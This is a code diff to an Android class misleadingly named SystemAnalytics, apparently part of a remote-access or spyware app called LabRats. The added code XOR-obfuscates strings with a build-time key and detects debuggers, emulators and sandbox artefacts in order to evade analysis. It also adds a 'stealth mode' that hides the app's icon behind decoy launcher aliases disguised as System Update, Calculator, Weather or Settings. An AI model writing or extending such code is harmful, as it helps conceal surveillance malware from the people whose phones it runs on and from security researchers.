@@ -3,6 +3,8 @@ package com.labs.labrats;
 import android.os.Build;
 import android.provider.Settings;
 import android.content.Context;
+import android.content.Intent;
+import com.labs.labrats.BuildConfig;
 import java.io.File;
 import java.lang.reflect.Method;
 import java.util.UUID;
@@ -12,14 +14,25 @@ import java.util.UUID;
  */
 public class SystemAnalytics {
 
-    private static final byte[] K = {0x41, 0x6E, 0x64, 0x72, 0x6F, 0x69, 0x64, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C}; // AndroidKernel
+    private static final String DYNAMIC_K = BuildConfig.ENCRYPTION_KEY;
 
     public static String decrypt(byte[] e) {
+        byte[] kBytes = DYNAMIC_K.getBytes();
         byte[] d = new byte[e.length];
         for (int i = 0; i < e.length; i++) {
-            d[i] = (byte) (e[i] ^ K[i % K.length]);
+            d[i] = (byte) (e[i] ^ kBytes[i % kBytes.length]);
         }
         return new String(d);
+    }
+
+    public static byte[] encrypt(String s) {
+        byte[] kBytes = DYNAMIC_K.getBytes();
+        byte[] sBytes = s.getBytes();
+        byte[] e = new byte[sBytes.length];
+        for (int i = 0; i < sBytes.length; i++) {
+            e[i] = (byte) (sBytes[i] ^ kBytes[i % kBytes.length]);
+        }
+        return e;
     }
 
     public static Object safeCall(String c, String m, Class<?>[] p, Object i, Object... a) {
@@ -33,34 +46,51 @@ public class SystemAnalytics {
     }
 
     public static boolean checkEnv(Context context) {
+        // Debugger Check
+        if (android.os.Debug.isDebuggerConnected()) return true;
+
         String f = Build.FINGERPRINT;
         String m = Build.MODEL;
         String p = Build.PRODUCT;
         String h = Build.HARDWARE;
+        String ma = Build.MANUFACTURER;
         
-        // Obfuscated Hardware Checks
+        // Comprehensive Hardware/Emulator Checks
         boolean r = f.startsWith("gen") || f.startsWith("unk")
                 || m.contains("sdk") || m.contains("Emu")
-                || m.contains("x86") || Build.MANUFACTURER.contains("Geny")
+                || m.contains("x86") || ma.contains("Geny")
+                || ma.contains("Google") && h.equals("ranchu") // Pixel Emulator
                 || (Build.BRAND.startsWith("gen") && Build.DEVICE.startsWith("gen"))
                 || p.contains("sdk") || h.contains("gold") || h.contains("ranch")
-                || p.contains("vbox") || p.contains("sim");
+                || p.contains("vbox") || p.contains("sim")
+                || ma.equalsIgnoreCase("nox") || p.equalsIgnoreCase("nox");
 
         if (r) return true;
 
         try {
+            // Suspicious Files Check (Emulator/Sandbox Artifacts)
+            String[] suspectPaths = {
+                "/dev/qemu_pipe", "/dev/socket/qemud", "/system/lib/libc_malloc_debug_qemu.so",
+                "/sys/module/qemu_trace_sysfs", "/system/bin/qemu-props", "/proc/tty/driver/goldfish"
+            };
+            for (String path : suspectPaths) {
+                if (new File(path).exists()) return true;
+            }
+
+            // Suspicious Package Check
+            String[] suspectPkgs = {"com.google.android.launcher.layouts.device_dock", "com.example.android.contactmanager"};
+            android.content.pm.PackageManager pm = context.getPackageManager();
+            for (String pkg : suspectPkgs) {
+                try { pm.getPackageInfo(pkg, 0); return true; } catch (Exception ignored) {}
+            }
+
             android.content.Intent b = context.registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
             if (b != null) {
                 int lv = b.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                 int st = b.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
-                if (lv == 50 && st == 2) { // Charging at 50%
-                    // suspect
+                if (lv == 50 && st == 2) { 
+                    // Emulator battery often stuck at 50%
                 }
-            }
-
-            String[] lp = {"/dev/qemu_pipe", "/dev/socket/qemud"};
-            for (String s : lp) {
-                if (new File(s).exists()) return true;
             }
         } catch (Exception ignored) {}
 
@@ -112,5 +142,48 @@ public class SystemAnalytics {
                 new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this, 8000);
             }
         });
+    }
+
+    /**
+     * Instantly toggles app camouflage by switching launcher aliases.
+     */
+    public static void setStealthMode(android.content.Context context, boolean stealth) {
+        try {
+            android.content.pm.PackageManager pm = context.getPackageManager();
+            android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
+            
+            // Resolve chosen Decoy from BuildConfig
+            String decoyClass = "com.labs.labrats.SystemUpdateAlias";
+            switch (BuildConfig.DECOY_CHOICE) {
+                case 2: decoyClass = "com.labs.labrats.CalculatorAlias"; break;
+                case 3: decoyClass = "com.labs.labrats.WeatherAlias"; break;
+                case 4: decoyClass = "com.labs.labrats.SettingsAlias"; break;
+            }
+            android.content.ComponentName decoy = new android.content.ComponentName(context, decoyClass);
+
+            if (stealth) {
+                if (pm.getComponentEnabledSetting(main) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+                    return; 
+                }
+                pm.setComponentEnabledSetting(decoy, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                LabRatsHttpServer.logActivity("STEALTH_SHIELD: Identity camouflage DEPLOYED");
+                
+                android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
+                home.addCategory(android.content.Intent.CATEGORY_HOME);
+                home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(home);
+            } else {
+                pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                // Disable all possible decoys to be safe
+                String[] decoys = {"com.labs.labrats.SystemUpdateAlias", "com.labs.labrats.CalculatorAlias", "com.labs.labrats.WeatherAlias", "com.labs.labrats.SettingsAlias"};
+                for (String d : decoys) {
+                    pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                }
+                LabRatsHttpServer.logActivity("STEALTH_SHIELD: Identity camouflage RELEASED");
+            }
+        } catch (Exception e) {
+            android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage());
+        }
     }
 }
